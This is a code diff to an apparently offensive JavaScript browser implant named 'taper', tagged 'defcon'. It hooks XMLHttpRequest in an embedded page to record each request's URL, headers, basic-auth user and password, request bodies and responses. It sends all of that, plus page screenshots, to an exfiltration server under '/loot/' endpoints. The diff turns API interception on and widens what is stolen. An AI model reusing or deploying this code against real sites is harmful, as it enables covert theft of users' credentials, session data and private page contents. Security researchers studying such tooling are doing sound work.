@@ -78,8 +78,9 @@ function initGlobals()
 		// load the page the user was on in the iframe
 		// when they reloaded the page. Otherwise,
 		// they'll start here
-		window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
+		//window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
 		//window.taperstartingPage = "https://127.0.0.1:8443/";
+		window.taperstartingPage = "http://127.0.0.1:5000";
 	}
 	else // if implant mode
 	{
@@ -104,7 +105,7 @@ function initGlobals()
 
 
 	// Should we set an optional client tag?
-	window.taperTag = "testTag";
+	window.taperTag = "defcon";
 
 	// Should we exfil the entire HTML code?
 	window.taperexfilHTML = true;
@@ -115,7 +116,7 @@ function initGlobals()
 	
 
 	// Should we try to monkey patch underlying API prototypes?
-	window.monkeyPatchAPIs = false;
+	window.monkeyPatchAPIs = true;
 
 
 	// Should we capture a screenshot after a delay after an API call?
@@ -252,12 +253,12 @@ function sendScreenshot()
 				// console.log(this.responseText)
 			};
 
-			// request = new XMLHttpRequest();
-			request = new window.taperXHR();
-			request.noIntercept = true;
-			request.addEventListener("load", responseHandler);
-			request.open("POST", taperexfilServer + "/loot/screenshot/" + 
-				sessionStorage.getItem('taperSessionUUID'));
+			// // request = new XMLHttpRequest();
+			// request = new window.taperXHR();
+			// request.noIntercept = true;
+			// request.addEventListener("load", responseHandler);
+			// request.open("POST", taperexfilServer + "/loot/screenshot/" + 
+			// 	sessionStorage.getItem('taperSessionUUID'));
 
 
 			// Helps hide flashing of the page when clicking around
@@ -272,6 +273,13 @@ function sendScreenshot()
 
 			canvas.toBlob((blob) => 
 			{
+				// request = new XMLHttpRequest();
+				request = new window.taperXHR();
+				request.noIntercept = true;
+				request.addEventListener("load", responseHandler);
+				request.open("POST", taperexfilServer + "/loot/screenshot/" + 
+				sessionStorage.getItem('taperSessionUUID'));
+
 				const image = blob;
 				request.send(image);
 			});
@@ -970,15 +978,35 @@ function monkeyPatchXHR()
 	const xhrOriginalSend      = window.XMLHttpRequest.prototype.send;
 
 
+	// Stash stuff for later access
+	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.requestDetails = {
+	    method: null,
+	    url: null,
+	    headers: {},
+	    body: null,
+	    async: true,
+	    user: null,
+	    password: null,
+	    responseBody: null,
+	    responseStatus: null
+	};
+
 
 	//Monkey patch open
 	// XHR monkeypatch only stable in trap mode
 	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.open = function(method, url, async, user, password) 
 	{
 		var method = arguments[0];
-		var url = arguments[1];
+		var url    = arguments[1];
 
 		// console.log("Intercepted XHR open: " + method + ", " + url);
+
+		// Stash it all
+      	this.requestDetails.method   = method;
+        this.requestDetails.url      = url;
+        this.requestDetails.async    = async;
+        this.requestDetails.user     = user;
+        this.requestDetails.password = password;
 
 
 		// send loot
@@ -1004,6 +1032,9 @@ function monkeyPatchXHR()
 		var header = arguments[0];
 		var value  = arguments[1];
 
+		// Stash it
+		this.requestDetails.headers[header] = value;
+
 		// console.log("$$$ MonekeyURL: " + this.url);
 
 		// console.log("Intercepted Header = " + header + ": " + value);
@@ -1024,62 +1055,84 @@ function monkeyPatchXHR()
 	}
 
 
-  	// Monkey patch send
-	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.send = function(data) 
+	// Monkey patch send
+	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.send = function(data) {
+	    var originalOnReadyStateChange = this.onreadystatechange;  // Save the original handler
+
+	    // Your interception logic
+	    var requestBody = btoa(data);
+
+	    // stash it
+	    this.requestDetails.body = requestBody;
+
+
+	    this.onreadystatechange = function() {
+	        // Call the original handler first, if it exists
+	        if (originalOnReadyStateChange) {
+	            originalOnReadyStateChange.apply(this, arguments);
+	        }
+
+	        // Then do your logging
+	        if (this.readyState === 4) {
+	            var data;
+
+	            if (!this.responseType || this.responseType === "text") {
+	                data = this.responseText;
+	            } else if (this.responseType === "document") {
+	                data = this.responseXML;
+	            } else if (this.responseType === "json") {
+	                data = JSON.stringify(this.response);
+	            } else {
+	                data = this.response;
+	            }
+
+	            var responseBody = btoa(data);
+
+	           	// Stash the response
+	            this.requestDetails.responseBody   = responseBody;
+	            this.requestDetails.responseStatus = this.status;
+
+
+
+	            var request = new XMLHttpRequest();
+	            request.open("POST", taperexfilServer + "/loot/xhrCall/" + sessionStorage.getItem('taperSessionUUID'));
+	            request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+	            var jsonObj = new Object();
+	            jsonObj["requestBody"]  = requestBody;
+	            jsonObj["responseBody"] = responseBody;
+	            var jsonString = JSON.stringify(jsonObj);
+
+	            request.send(jsonString);
+
+	            // now the big dump
+	           	console.log("+++ XHR request dump: ")
+			    console.log(this.requestDetails);
+
+		        var request = new XMLHttpRequest();
+		        request.open("POST", taperexfilServer + "/loot/xhrRequestDump/" + sessionStorage.getItem('taperSessionUUID'));
+		        request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+		        var jsonString = JSON.stringify(this.requestDetails);
+		        request.send(jsonString);
+	        }
+	    };
+
+
+
+
+	    xhrOriginalSend.call(this, data);  // Ensure to use the original send
+	};
+
+
+	//xhrOriginalSend.apply(this, arguments);
+
+	// Check if we should take a screenshot now
+	if (window.postApiCallScreenshot)
 	{
-		// console.log("Intercepted request body: " + data);
-
-		var requestBody = btoa(data);
-
-
-		this.onreadystatechange = function()
-		{
-			if (this.readyState === 4)
-			{
-				var data;
-
-				if (!this.responseType || this.responseType === "text") 
-				{
-					data = this.responseText;
-				} 
-				else if (this.responseType === "document") 
-				{
-					data = this.responseXML;
-				} 
-				else if (this.responseType === "json") 
-				{
-					data = JSON.stringify(this.response);
-				} 
-				else 
-				{
-					data = xhr.response;
-				}
-
-				var responseBody = btoa(data);
-				// var response = read_body(this);
-				// console.log("Intercepted response: " + data);
-
-				request = new XMLHttpRequest();
-				request.open("POST", taperexfilServer + "/loot/xhrCall/" + sessionStorage.getItem('taperSessionUUID'));
-				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-
-				var jsonObj = new Object();
-				jsonObj["requestBody"]  = requestBody;
-				jsonObj["responseBody"] = responseBody;
-				var jsonString          = JSON.stringify(jsonObj);
-				request.send(jsonString);
-			}
-		};
-
-		xhrOriginalSend.apply(this, arguments);
-
-		// Check if we should take a screenshot now
-		if (window.postApiCallScreenshot)
-		{
-			setTimeout(sendScreenshot, window.screenshotDelay);
-		}
+		setTimeout(sendScreenshot, window.screenshotDelay);
 	}
 }
+
 
 
 
